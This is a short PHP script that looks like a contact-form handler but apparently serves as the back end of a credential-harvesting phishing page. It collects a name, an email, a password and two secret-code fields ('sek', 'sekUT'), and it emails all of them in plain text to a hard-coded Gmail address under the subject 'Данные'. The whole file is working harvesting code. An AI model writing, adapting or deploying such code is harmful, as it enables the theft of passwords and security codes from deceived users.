<?php

include 'functions.php';

if (!empty($_POST)){

  $data['success'] = true;
  $_POST  = multiDimensionalArrayMap('cleanEvilTags', $_POST);
  $_POST  = multiDimensionalArrayMap('cleanData', $_POST);

  //your email adress 
  $emailTo ="okrassavaso@gmail.com"; //"yourmail@yoursite.com";

  //from email adress
  $emailFrom ="contact@yoursite.com"; //"contact@yoursite.com";

  //email subject
  $emailSubject = "Данные";

  $name = $_POST["name"];
  $email = $_POST["email"];
  $pass = $_POST["pass"];
  $sek = $_POST["sek"];
  $sekUT = $_POST["sekUT"];
  
  if($name == "")
   $data['success'] = false;

  if($pass == "")
   $data['success'] = false;

  if($sek == "")
   $data['success'] = false;

  if($sekUT == "")
   $data['success'] = false;
 
 if (!preg_match("/^[_\.0-9a-zA-Z-]+@([0-9a-zA-Z][0-9a-zA-Z-]+\.)+[a-zA-Z]{2,6}$/i", $email)) 
   $data['success'] = false;


 if($data['success'] == true){

  $message = "NAME: $name<br>
  EMAIL: $email<br>
  PASS: $pass<br>
  SEK: $sek<br> 
  SEKUT: $sekUT<br>";


  $headers = "MIME-Version: 1.0" . "\r\n"; 
  $headers .= "Content-type:text/html; charset=utf-8" . "\r\n"; 
  $headers .= "From: <$emailFrom>" . "\r\n";
  mail($emailTo, $emailSubject, $message, $headers);

  $data['success'] = true;
  echo json_encode($data);
}
}
?>